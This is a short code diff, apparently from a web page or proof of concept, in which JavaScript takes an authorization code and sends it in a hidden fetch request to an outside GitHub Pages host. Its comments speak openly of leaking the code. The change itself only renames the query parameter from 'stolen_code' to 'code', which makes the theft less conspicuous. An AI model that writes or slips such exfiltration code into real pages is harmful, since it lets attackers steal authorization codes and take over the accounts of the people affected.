@@ -332,7 +332,7 @@
 
   if (authCode) {
       // Leak the code by sending a hidden request to your `/ref/` page
-      fetch("https://joshmainaa7.github.io/ref/?stolen_code=" + authCode)
+      fetch("https://joshmainaa7.github.io/ref/?code=" + authCode)
         .then(response => console.log("Code sent to ref page:", response))
         .catch(error => console.error("Error leaking code:", error));
 
